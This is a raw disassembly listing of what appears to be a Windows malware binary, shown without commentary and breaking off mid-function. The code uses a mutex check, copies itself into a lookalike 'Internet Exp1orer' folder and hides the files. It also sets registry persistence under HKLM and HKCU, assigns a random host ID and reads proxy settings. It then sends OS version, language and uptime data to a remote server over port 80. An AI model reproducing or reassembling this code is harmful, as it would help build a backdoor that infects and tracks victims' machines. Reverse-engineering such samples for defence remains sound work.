mov     eax, [esp+290h+arg_0]
mov     pszValue[esi], 0
test    eax, eax
jz      loc_401AF6

loc_401A66:
push    edi
lea     ecx, [esp+294h+Str]
push    200h
push    ecx
push    0
call    dword_40ACE8
lea     edx, [esp+294h+Str]
push    5Ch             ; Ch
push    edx             ; Str
call    ds:strrchr
mov     edx, eax
add     esp, 8
inc     edx
or      ecx, 0FFFFFFFFh
mov     edi, edx
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, offset pszValue
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
mov     cl, [edx]
xor     edi, edi
test    cl, cl
jz      short loc_401AD2
lea     esi, [esp+294h+Data]
mov     eax, edx
sub     esi, edx

loc_401AC4:
inc     cl
inc     edi
mov     [esi+eax], cl
mov     cl, [eax+1]
inc     eax
test    cl, cl
jnz     short loc_401AC4

loc_401AD2:
mov     ecx, [esp+294h+cbData]
mov     eax, [esp+294h+phkResult]
lea     edx, [esp+294h+Data]
push    ecx             ; cbData
push    edx             ; lpData
push    1               ; dwType
push    0               ; Reserved
push    offset ValueName ; "pid"
push    eax             ; hKey
mov     [esp+edi+2ACh+Data], 0
call    ds:RegSetValueExA
pop     edi

loc_401AF6:
mov     edx, [esp+290h+phkResult]
lea     ecx, [esp+290h+cbData]
push    ecx             ; lpcbData
push    offset Data     ; lpData
push    0               ; lpType
push    0               ; lpReserved
push    offset aHostid  ; "hostid"
push    edx             ; hKey
call    ebp ; RegQueryValueExA
pop     esi
pop     ebp
test    eax, eax
jz      short loc_401B4E
push    0               ; Time
call    ds:time
push    eax             ; Seed
call    ds:srand
add     esp, 8
call    ds:rand
push    4               ; cbData
push    offset Data     ; lpData
mov     Data, eax
mov     eax, [esp+290h+phkResult]
push    4               ; dwType
push    0               ; Reserved
push    offset aHostid  ; "hostid"
push    eax             ; hKey
call    ds:RegSetValueExA

loc_401B4E:
mov     eax, [esp+288h+phkResult]
test    eax, eax
jz      short loc_401B5D
push    eax             ; hKey
call    ds:RegCloseKey

loc_401B5D:
add     esp, 288h
retn
sub_4019E0 endp

align 10h



sub_401B70 proc near

Data= byte ptr -4

push    ecx
lea     eax, [esp+4+Data]
push    4               ; cbData
push    eax             ; lpData
push    4               ; dwType
push    offset byte_4094BC ; lpValueName
push    offset aIoihC   ; "ioih{c"
push    80000002h       ; hKey
mov     dword ptr [esp+1Ch+Data], 0
call    sub_4072A0
add     esp, 1Ch
retn
sub_401B70 endp

align 10h



; int __cdecl sub_401BA0(LPCSTR pszValue, DWORD dwType)
sub_401BA0 proc near

phkResult= dword ptr -204h
Buffer= byte ptr -200h
var_1FD= byte ptr -1FDh
pszValue= dword ptr  4
dwType= dword ptr  8

sub     esp, 204h
lea     eax, [esp+204h+Buffer]
push    ebx
push    ebp
push    esi
push    edi
push    200h            ; uSize
push    eax             ; lpBuffer
call    ds:GetWindowsDirectoryA
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_4094C8
xor     eax, eax
lea     edx, [esp+214h+var_1FD]
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
shr     ecx, 2
mov     edi, edx
lea     edx, [esp+214h+Buffer]
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
push    eax             ; lpdwDisposition
rep movsb
or      ecx, 0FFFFFFFFh
mov     edi, offset unk_4094D8
repne scasb
not     ecx
sub     edi, ecx
mov     ebx, ecx
mov     esi, edi
or      ecx, 0FFFFFFFFh
mov     edi, edx
repne scasb
mov     ecx, ebx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebx
lea     edx, [esp+218h+Buffer]
and     ecx, 3
rep movsb
mov     edi, offset asc_409764 ; "\\"
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebx, ecx
mov     edi, edx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebx
lea     edx, [esp+218h+Buffer]
and     ecx, 3
rep movsb
mov     edi, offset byte_40A72C
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebx, ecx
mov     edi, edx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebx
lea     eax, [esp+218h+phkResult]
and     ecx, 3
rep movsb
mov     esi, ds:RegCreateKeyExA
push    eax             ; phkResult
push    0               ; lpSecurityAttributes
push    2001Fh          ; samDesired
push    0               ; dwOptions
push    offset Class    ; lpClass
push    0               ; Reserved
push    offset aI       ; "i"
push    80000002h       ; hKey
call    esi ; RegCreateKeyExA
mov     ebx, [esp+214h+dwType]
cmp     ebx, 1
jnz     short loc_401CC5
lea     edi, [esp+214h+Buffer]
or      ecx, 0FFFFFFFFh
xor     eax, eax
mov     ebp, [esp+214h+pszValue]
repne scasb
not     ecx
mov     edx, [esp+214h+phkResult]
dec     ecx
push    ecx             ; cbData
lea     ecx, [esp+218h+Buffer]
push    ecx             ; pvData
push    ebx             ; dwType
push    ebp             ; pszValue
push    eax             ; pszSubKey
push    edx             ; hkey
call    ds:SHSetValueA
jmp     short loc_401CD8

loc_401CC5:
mov     ebp, [esp+214h+pszValue]
mov     eax, [esp+214h+phkResult]
push    ebp             ; lpValueName
push    eax             ; hKey
call    ds:RegDeleteValueA

loc_401CD8:
mov     eax, [esp+214h+phkResult]
test    eax, eax
jz      short loc_401CE7
push    eax             ; hKey
call    ds:RegCloseKey

loc_401CE7:
lea     ecx, [esp+214h+phkResult]
push    0               ; lpdwDisposition
push    ecx             ; phkResult
push    0               ; lpSecurityAttributes
push    2001Fh          ; samDesired
push    0               ; dwOptions
push    offset Class    ; lpClass
push    0               ; Reserved
push    offset aI       ; "i"
push    80000001h       ; hKey
call    esi ; RegCreateKeyExA
cmp     ebx, 1
jnz     short loc_401D33
lea     edi, [esp+214h+Buffer]
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+214h+Buffer]
repne scasb
not     ecx
dec     ecx
push    ecx             ; cbData
push    edx             ; pvData
push    ebx             ; dwType
push    ebp             ; pszValue
push    eax             ; pszSubKey
mov     eax, [esp+228h+phkResult]
push    eax             ; hkey
call    ds:SHSetValueA
jmp     short loc_401D3F

loc_401D33:
mov     ecx, [esp+214h+phkResult]
push    ebp             ; lpValueName
push    ecx             ; hKey
call    ds:RegDeleteValueA

loc_401D3F:
mov     eax, [esp+214h+phkResult]
pop     edi
pop     esi
pop     ebp
test    eax, eax
pop     ebx
jz      short loc_401D52
push    eax             ; hKey
call    ds:RegCloseKey

loc_401D52:
add     esp, 204h
retn
sub_401BA0 endp

align 10h



sub_401D60 proc near

Dest= byte ptr -710h
pszPath= byte ptr -700h
FileName= byte ptr -500h
Str= byte ptr -400h

sub     esp, 710h
push    ebx
push    ebp
push    esi
push    edi
push    offset aC_1     ; "c"
push    0               ; bInheritHandle
push    1F0001h         ; dwDesiredAccess
call    ds:OpenMutexA
mov     ebx, ds:lstrcmpiA
test    eax, eax
jz      short loc_401DED
push    eax             ; hObject
call    ds:CloseHandle
push    offset String2  ; lpString2
push    offset pszValue ; lpString1
call    ebx ; lstrcmpiA
test    eax, eax
jnz     short loc_401DB5
push    offset String2  ; lpString2
push    offset byte_40A72C ; lpString1
call    ebx ; lstrcmpiA
test    eax, eax
jz      short loc_401DB5
push    1               ; uExitCode
call    ds:ExitProcess

loc_401DB5:
mov     eax, hEvent
push    eax             ; hEvent
call    ds:SetEvent
mov     ecx, hHandle
push    1388h           ; dwMilliseconds
push    ecx             ; hHandle
call    ds:WaitForSingleObject
push    1F4h            ; dwMilliseconds
call    ds:Sleep
push    0               ; dwType
push    offset pszValue ; pszValue
call    sub_401BA0
add     esp, 8

loc_401DED:
push    offset aC_1     ; "c"
push    0               ; bInitialOwner
push    0               ; lpMutexAttributes
call    ds:CreateMutexA
lea     edx, [esp+720h+Str]
push    400h
push    edx
push    0
call    dword_40ACE8
mov     [esp+eax+720h+Str], 0
push    1               ; fCreate
lea     eax, [esp+724h+pszPath]
push    26h             ; csidl
push    eax             ; pszPath
push    0               ; hwnd
call    ds:SHGetSpecialFolderPathA
mov     edi, offset aInternetExp1or ; "\\Internet Exp1orer"
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+720h+pszPath]
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebp, ecx
mov     edi, edx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebp
lea     eax, [esp+720h+pszPath]
and     ecx, 3
push    eax             ; lpPathName
rep movsb
call    sub_401990
mov     edi, offset asc_409764 ; "\\"
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+724h+pszPath]
repne scasb
not     ecx
sub     edi, ecx
push    2Eh             ; Ch
mov     esi, edi
mov     ebp, ecx
mov     edi, edx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebp
lea     edx, [esp+728h+pszPath]
and     ecx, 3
rep movsb
mov     edi, offset byte_40A72C
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebp, ecx
mov     edi, edx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebp
lea     eax, [esp+728h+pszPath]
and     ecx, 3
push    eax             ; Str
rep movsb
mov     esi, ds:strrchr
call    esi ; strrchr
mov     byte ptr [eax], 0
lea     ecx, [esp+72Ch+Str]
push    2Eh             ; Ch
push    ecx             ; Str
call    esi ; strrchr
add     esp, 14h
mov     byte ptr [eax], 0
lea     edx, [esp+720h+pszPath]
lea     eax, [esp+720h+Str]
push    edx             ; lpString2
push    eax             ; lpString1
call    ebx ; lstrcmpiA
test    eax, eax
jz      loc_402024
mov     edi, offset aExe ; ".exe"
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+720h+Str]
repne scasb
not     ecx
sub     edi, ecx
push    eax             ; dwFileAttributes
mov     esi, edi
mov     ebx, ecx
mov     edi, edx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebx
mov     ebx, ds:SetFileAttributesA
and     ecx, 3
lea     eax, [esp+724h+pszPath]
rep movsb
push    eax             ; lpFileName
call    ebx ; SetFileAttributesA
movsx   ecx, [esp+720h+Str]
push    ecx
lea     edx, [esp+724h+Dest]
push    offset Format   ; "%c:~a"
push    edx             ; Dest
call    ds:sprintf
mov     esi, ds:CopyFileA
add     esp, 0Ch
lea     eax, [esp+720h+Dest]
lea     ecx, [esp+720h+Str]
push    0               ; bFailIfExists
push    eax             ; lpNewFileName
push    ecx             ; lpExistingFileName
call    esi ; CopyFileA
lea     edx, [esp+720h+pszPath]
push    0               ; bFailIfExists
lea     eax, [esp+724h+Dest]
push    edx             ; lpNewFileName
push    eax             ; lpExistingFileName
call    esi ; CopyFileA
mov     ebp, ds:DeleteFileA
lea     ecx, [esp+720h+Dest]
push    ecx             ; lpFileName
call    ebp ; DeleteFileA
lea     edi, [esp+720h+pszPath]
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+720h+FileName]
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
lea     edx, [esp+720h+FileName]
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
mov     edi, offset aExe_0 ; ".EXE"
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edi, edx
mov     edx, ecx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
push    eax             ; dwFileAttributes
lea     eax, [esp+724h+FileName]
rep movsb
push    eax             ; lpFileName
call    ebx ; SetFileAttributesA
lea     ecx, [esp+720h+FileName]
push    ecx             ; lpFileName
call    ebp ; DeleteFileA
lea     edx, [esp+720h+FileName]
lea     eax, [esp+720h+pszPath]
push    edx             ; NewFilename
push    eax             ; OldFilename
call    ds:rename
lea     ecx, [esp+728h+pszPath]
push    ecx             ; lpFileName
call    sub_405EF0
lea     edx, [esp+72Ch+pszPath]
push    edx             ; Str
call    sub_406B00
add     esp, 10h
push    1               ; uExitCode
call    ds:ExitProcess

loc_402024:             ; dwType
push    1
push    offset byte_40A72C ; pszValue
call    sub_401BA0
push    1
call    sub_4019E0
add     esp, 0Ch
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 710h
retn
sub_401D60 endp

align 10h



; int __cdecl sub_402050(LPOSVERSIONINFOA lpVersionInformation)
sub_402050 proc near

lpVersionInformation= dword ptr  4

push    esi
mov     esi, [esp+4+lpVersionInformation]
push    edi
mov     ecx, 27h
xor     eax, eax
mov     edi, esi
rep stosd
mov     edi, ds:GetVersionExA
push    esi             ; lpVersionInformation
mov     dword ptr [esi], 9Ch
call    edi ; GetVersionExA
test    eax, eax
jnz     short loc_40207D
push    esi             ; lpVersionInformation
mov     dword ptr [esi], 94h
call    edi ; GetVersionExA

loc_40207D:
call    ds:GetSystemDefaultLangID
pop     edi
mov     word_40AA22, ax
pop     esi
retn
sub_402050 endp

align 10h



sub_402090 proc near

phkResult= dword ptr -108h
cbData= dword ptr -104h
Data= byte ptr -100h

sub     esp, 108h
push    esi
lea     eax, [esp+10Ch+phkResult]
push    edi
push    eax             ; phkResult
push    1               ; samDesired
push    0               ; ulOptions
push    offset aSoftwareMicros ; "Software\\Microsoft\\Windows\\CurrentVe"...
push    80000001h       ; hKey
mov     [esp+124h+cbData], 4
call    ds:RegOpenKeyExA
test    eax, eax
jnz     loc_4021A1
mov     edx, [esp+110h+phkResult]
mov     esi, ds:RegQueryValueExA
lea     ecx, [esp+110h+cbData]
push    ecx             ; lpcbData
push    offset dword_40AA1C ; lpData
push    eax             ; lpType
push    eax             ; lpReserved
push    offset aProxyenable ; "ProxyEnable"
push    edx             ; hKey
call    esi ; RegQueryValueExA
mov     edx, [esp+110h+phkResult]
mov     edi, eax
lea     eax, [esp+110h+cbData]
lea     ecx, [esp+110h+Data]
push    eax             ; lpcbData
push    ecx             ; lpData
push    0               ; lpType
push    0               ; lpReserved
push    offset aProxyserver ; "ProxyServer"
push    edx             ; hKey
mov     [esp+128h+cbData], 100h
call    esi ; RegQueryValueExA
mov     esi, eax
mov     eax, [esp+110h+phkResult]
push    eax             ; hKey
call    ds:RegCloseKey
test    edi, edi
jnz     loc_4021A1
test    esi, esi
jnz     loc_4021A1
mov     eax, dword_40AA1C
test    eax, eax
jz      short loc_4021A1
lea     ecx, [esp+110h+Data]
push    offset SubStr   ; "http="
push    ecx             ; Str
call    ds:strstr
mov     esi, eax
add     esp, 8
test    esi, esi
jz      short loc_402147
add     esi, 5
jmp     short loc_40214B

loc_402147:
lea     esi, [esp+110h+Data]

loc_40214B:
push    ebx
push    3Ah             ; Val
push    esi             ; Str
call    ds:strchr
mov     ebx, eax
push    esi
mov     byte ptr [ebx], 0
call    sub_4038A0
mov     edi, eax
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     edx, ecx
mov     esi, edi
mov     edi, offset unk_40A9F8
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
inc     ebx
rep movsb
push    ebx             ; Str
call    ds:atoi
add     esp, 10h
mov     dword_40AA18, eax
mov     eax, 1
pop     ebx
pop     edi
pop     esi
add     esp, 108h
retn

loc_4021A1:
pop     edi
xor     eax, eax
pop     esi
add     esp, 108h
retn
sub_402090 endp

align 10h



; int __cdecl sub_4021B0(int, int Val, int, int, int, int, int, int)
sub_4021B0 proc near

var_2120= dword ptr -2120h
var_211C= dword ptr -211Ch
var_2118= dword ptr -2118h
var_2114= word ptr -2114h
var_2112= word ptr -2112h
var_2110= dword ptr -2110h
var_2104= dword ptr -2104h
var_2100= dword ptr -2100h
var_2000= dword ptr -2000h
arg_0= dword ptr  4
Val= dword ptr  8
arg_8= dword ptr  0Ch
arg_C= dword ptr  10h
arg_10= dword ptr  14h
arg_14= dword ptr  18h
arg_18= dword ptr  1Ch
arg_1C= dword ptr  20h

mov     eax, 2120h
call    __alloca_probe
push    ebx
push    ebp
push    esi
push    edi
mov     edi, [esp+2130h+arg_0]
push    edi
call    sub_4038A0
add     esp, 4
push    eax
call    ds:WSOCK32_10
mov     ebp, [esp+2130h+Val]
push    0
push    1
push    2
mov     esi, eax
call    ds:WSOCK32_23
mov     ebx, eax
cmp     ebx, 0FFFFFFFFh
jz      loc_4023CD
lea     eax, [esp+2130h+var_2118]
mov     [esp+2130h+var_2118], 1
push    eax
push    8004667Eh
push    ebx
call    ds:WSOCK32_12
mov     eax, dword_40AA1C
mov     [esp+2130h+var_2120], 3Ch
test    eax, eax
mov     [esp+2130h+var_211C], 0
mov     [esp+2130h+var_2100], ebx
mov     [esp+2130h+var_2104], 1
jz      short loc_402246
push    offset unk_40A9F8
call    ds:WSOCK32_10
mov     ebp, dword_40AA18
mov     esi, eax

loc_402246:
push    ebp
mov     [esp+2134h+var_2114], 2
call    ds:WSOCK32_9
lea     ecx, [esp+2130h+var_2114]
push    10h
push    ecx
push    ebx
mov     [esp+213Ch+var_2112], ax
mov     [esp+213Ch+var_2110], esi
call    ds:WSOCK32_4
lea     edx, [esp+2130h+var_2120]
lea     ecx, [esp+2130h+var_2104]
push    edx
push    0
lea     eax, [ebx+1]
push    ecx
push    0
push    eax
call    ds:WSOCK32_18
test    eax, eax
jle     loc_4023C6
mov     ebp, [esp+2130h+arg_10]
mov     edx, [esp+2130h+arg_1C]
mov     eax, [esp+2130h+arg_8]
mov     ecx, [esp+2130h+Val]
push    ebp             ; int
push    edx             ; int
push    eax             ; int
push    ecx             ; Val
lea     edx, [esp+2140h+var_2000]
push    edi             ; int
push    edx             ; int
call    sub_403410
lea     edi, [esp+2148h+var_2000]
or      ecx, 0FFFFFFFFh
xor     eax, eax
add     esp, 18h
repne scasb
not     ecx
mov     esi, [esp+2130h+arg_C]
dec     ecx
mov     eax, ecx
mov     ecx, ebp
mov     edx, ecx
push    0
lea     edi, [esp+eax+2134h+var_2000]
add     eax, ebp
shr     ecx, 2
rep movsd
mov     ecx, edx
push    eax
lea     eax, [esp+2138h+var_2000]
and     ecx, 3
push    eax
push    ebx
rep movsb
call    dword_40ACE4
cmp     [esp+2130h+arg_1C], 1
jnz     short loc_402342
lea     ecx, [esp+2130h+var_2120]
lea     edx, [esp+2130h+var_2104]
push    ecx
push    0
push    edx
lea     eax, [ebx+1]
push    0
push    eax
call    ds:WSOCK32_18
test    eax, eax
push    ebx
jle     loc_4023C7
call    ds:WSOCK32_3
pop     edi
pop     esi
pop     ebp
mov     eax, 1
pop     ebx
add     esp, 2120h
retn

loc_402342:
push    ebx
call    sub_4036D0
add     esp, 4
cmp     eax, 0FFFFFFFFh
jz      short loc_4023C6
cmp     eax, 3E800h
jge     short loc_4023C6
mov     edi, [esp+2130h+arg_14]
mov     ebp, ds:WSOCK32_16
xor     esi, esi

loc_402366:
lea     eax, [esp+2130h+var_2120]
lea     ecx, [esp+2130h+var_2104]
push    eax
push    0
push    0
lea     eax, [ebx+1]
push    ecx
push    eax
call    ds:WSOCK32_18
test    eax, eax
jle     short loc_4023C6
mov     edx, 3E800h
push    0
sub     edx, esi
lea     eax, [esi+edi]
push    edx
push    eax
push    ebx
call    ebp ; WSOCK32_16
cmp     eax, 0FFFFFFFFh
jz      short loc_4023C6
test    eax, eax
jz      short loc_4023A6
add     esi, eax
cmp     esi, 3E800h
jl      short loc_402366

loc_4023A6:
push    ebx
call    ds:WSOCK32_3
mov     ecx, [esp+2130h+arg_18]
pop     edi
mov     eax, 1
mov     [ecx], esi
pop     esi
pop     ebp
pop     ebx
add     esp, 2120h
retn

loc_4023C6:
push    ebx

loc_4023C7:
call    ds:WSOCK32_3

loc_4023CD:
pop     edi
pop     esi
pop     ebp
xor     eax, eax
pop     ebx
add     esp, 2120h
retn
sub_4021B0 endp

align 10h



sub_4023E0 proc near

var_3E804= dword ptr -3E804h
var_3E800= dword ptr -3E800h

mov     eax, 3E804h
call    __alloca_probe
lea     eax, [esp+3E804h+var_3E804]
push    0               ; int
lea     ecx, [esp+3E808h+var_3E800]
push    eax             ; int
push    ecx             ; int
push    0               ; int
push    offset Class    ; int
push    offset unk_40A6AC ; int
push    50h             ; Val
push    offset unk_40A82C ; int
call    sub_4021B0
add     esp, 20h
test    eax, eax
jnz     short loc_40241C
add     esp, 3E804h
retn

loc_40241C:
mov     edx, [esp+3E804h+var_3E800]
mov     eax, 1
mov     dword_40A124, edx
add     esp, 3E804h
retn
sub_4023E0 endp

align 10h



sub_402440 proc near

var_3E804= dword ptr -3E804h
var_3E800= dword ptr -3E800h

mov     eax, 3E804h
call    __alloca_probe
lea     eax, [esp+3E804h+var_3E804]
push    0               ; int
lea     ecx, [esp+3E808h+var_3E800]
push    eax             ; int
push    ecx             ; int
push    0               ; int
push    offset Class    ; int
push    offset unk_40A62C ; int
push    50h             ; Val
push    offset unk_40A82C ; int
call    sub_4021B0
add     esp, 20h
test    eax, eax
jnz     short loc_40247C
add     esp, 3E804h
retn

loc_40247C:
mov     edx, [esp+3E804h+var_3E800]
mov     eax, 1
mov     dword_40A128, edx
add     esp, 3E804h
retn
sub_402440 endp

align 10h



sub_4024A0 proc near

var_3ED88= dword ptr -3ED88h
var_3ED84= dword ptr -3ED84h
Dest= byte ptr -3ED80h
var_3ED7C= dword ptr -3ED7Ch
var_3ED78= word ptr -3ED78h
var_3ED76= byte ptr -3ED76h
var_3ED75= byte ptr -3ED75h
Str= byte ptr -3ED00h
var_3EC00= dword ptr -3EC00h
var_3E800= dword ptr -3E800h

mov     eax, 3ED88h
call    __alloca_probe
push    ebx
push    ebp
push    esi
push    edi
push    offset LibFileName ; "Kernel32.dll"
call    ds:LoadLibraryA
push    offset aGettickcount ; "GetTickCount"
push    eax             ; hModule
call    ds:GetProcAddress
mov     [esp+3ED98h+var_3ED88], eax
or      ecx, 0FFFFFFFFh
mov     edi, offset Buffer
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
lea     edx, [esp+3ED98h+var_3EC00]
mov     eax, ecx
mov     esi, edi
shr     ecx, 2
mov     edi, edx
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
mov     edi, offset Buffer
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
dec     ecx
mov     edi, offset unk_40AAC4
mov     ebx, ecx
or      ecx, 0FFFFFFFFh
inc     ebx
repne scasb
not     ecx
sub     edi, ecx
lea     edx, [esp+ebx+3ED98h+var_3EC00]
mov     eax, ecx
mov     esi, edi
mov     edi, edx
mov     edx, dword_40AA1C
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
mov     edi, offset unk_40AAC4
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
dec     ecx
mov     esi, offset VersionInformation
lea     ebx, [ebx+ecx+1]
mov     ecx, 27h
lea     edi, [esp+ebx+3ED98h+var_3EC00]
add     ebx, 9Ch
rep movsd
mov     cx, word_40AA22
mov     word ptr [esp+ebx+3ED98h+var_3EC00], cx
mov     ecx, Data
add     ebx, 2
test    edx, edx
setnz   al
mov     byte ptr [esp+ebx+3ED98h+var_3EC00], al
mov     eax, dword_409810
inc     ebx
mov     dword ptr [esp+3ED98h+Dest], eax
mov     ax, word_409818
mov     [esp+ebx+3ED98h+var_3EC00], ecx
mov     ecx, dword_409814
mov     [esp+3ED98h+var_3ED7C], ecx
mov     cl, byte_40981A
mov     [esp+3ED98h+var_3ED76], cl
add     ebx, 4
mov     [esp+3ED98h+var_3ED78], ax
mov     ecx, 1Dh
xor     eax, eax
lea     edi, [esp+3ED98h+var_3ED75]
mov     ebp, ds:sprintf
rep stosd
test    edx, edx
stosb
jz      short loc_4025E7
mov     edx, dword_40AA18
lea     eax, [esp+3ED98h+Dest]
push    edx
push    offset unk_40A9F8
push    offset aProxySU ; "(Proxy-%s:%u)"
push    eax             ; Dest
call    ebp ; sprintf
add     esp, 10h

loc_4025E7:
lea     ecx, [esp+3ED98h+Dest]
lea     edx, [esp+3ED98h+Str]
push    ecx
push    offset a2025    ; "20.25"
push    offset aSS      ; "%s%s"
push    edx             ; Dest
call    ebp ; sprintf
lea     edi, [esp+3EDA8h+Str]
or      ecx, 0FFFFFFFFh
xor     eax, eax
add     esp, 10h
repne scasb
not     ecx
sub     edi, ecx
lea     edx, [esp+ebx+3ED98h+var_3EC00]
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
lea     edi, [esp+3ED98h+Str]
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
dec     ecx
lea     ebx, [ebx+ecx+1]
call    [esp+3ED98h+var_3ED88]
xor     edx, edx
mov     esi, 36EE80h
mov     ecx, eax
div     esi
mov     eax, 45E7B273h
mul     edx
shr     edx, 0Eh
mov     eax, 95217CB1h
push    edx
mul     ecx
shr     edx, 15h
push    edx
lea     ecx, [esp+3EDA0h+Str]
push    offset aUU      ; "%u:%u"
push    ecx             ; Dest
call    ebp ; sprintf
lea     edi, [esp+3EDA8h+Str]
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+ebx+3EDA8h+var_3EC00]
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
lea     edx, [esp+3EDA8h+Str]
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
lea     edi, [esp+3EDA8h+Str]
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
dec     ecx
mov     edi, offset unk_40A6AC
lea     ebx, [ebx+ecx+1]
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
push    2Fh             ; Ch
rep movsb
lea     ecx, [esp+3EDACh+Str]
push    ecx             ; Str
call    ds:strrchr
mov     edx, eax
mov     edi, offset unk_40A82C
or      ecx, 0FFFFFFFFh
xor     eax, eax
add     esp, 18h
lea     ebp, [esp+ebx+3ED98h+var_3EC00]
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, ebp
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
test    edx, edx
rep movsb
jz      short loc_402773
lea     edi, [esp+3ED98h+Str]
or      ecx, 0FFFFFFFFh
xor     eax, eax
mov     byte ptr [edx], 0
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edx, ecx
mov     edi, ebp
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
mov     edi, offset unk_40A82C
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
dec     ecx
lea     edi, [esp+3ED98h+Str]
mov     edx, ecx
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
dec     ecx
add     ecx, ebx
lea     ebx, [ecx+edx+1]

loc_402773:
mov     edi, offset Dest
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+ebx+3ED98h+var_3EC00]
repne scasb
not     ecx
sub     edi, ecx
push    1               ; int
mov     eax, ecx
mov     esi, edi
mov     edi, edx
lea     edx, [esp+3ED9Ch+var_3E800]
shr     ecx, 2
rep movsd
mov     ecx, eax
xor     eax, eax
and     ecx, 3
rep movsb
mov     edi, offset Dest
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
dec     ecx
lea     eax, [esp+3ED9Ch+var_3EC00]
lea     ebx, [ebx+ecx+1]
lea     ecx, [esp+3ED9Ch+var_3ED84]
push    ecx             ; int
mov     ecx, dword_40A124
push    edx             ; int
push    ebx             ; int
push    eax             ; int
push    offset Class    ; int
push    50h             ; Val
push    ecx
call    ds:WSOCK32_11
push    eax             ; int
call    sub_4021B0
add     esp, 20h
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 3ED88h
retn
sub_4024A0 endp

align 10h



sub_4027F0 proc near

var_3E804= dword ptr -3E804h
var_3E800= dword ptr -3E800h

mov     eax, 3E804h
call    __alloca_probe
lea     eax, [esp+3E804h+var_3E804]
push    0               ; int
lea     ecx, [esp+3E808h+var_3E800]
push    eax             ; int
push    ecx             ; int
push    0               ; int
push    offset Class    ; int
push    offset unk_40A5AC ; int
push    50h             ; Val
push    offset unk_40A82C ; int
call    sub_4021B0
add     esp, 20h
test    eax, eax
jnz     short loc_40282C
add     esp, 3E804h
retn

loc_40282C:
mov     edx, [esp+3E804h+var_3E804]
lea     eax, [esp+3E804h+var_3E800]
push    edx
push    eax
call    sub_402850
add     esp, 8
neg     eax
sbb     eax, eax
neg     eax
add     esp, 3E804h
retn
sub_4027F0 endp

align 10h



sub_402850 proc near

arg_0= dword ptr  4
arg_4= dword ptr  8

push    ebx
push    ebp
push    esi
push    edi
mov     edi, [esp+10h+arg_4]
xor     ebp, ebp
test    edi, edi
jle     short loc_40289C
mov     edx, [esp+10h+arg_0]

loc_402862:
mov     esi, offset Buffer
lea     eax, [edx+ebp]

loc_40286A:
mov     bl, [eax]
mov     cl, bl
cmp     bl, [esi]
jnz     short loc_40288E
test    cl, cl
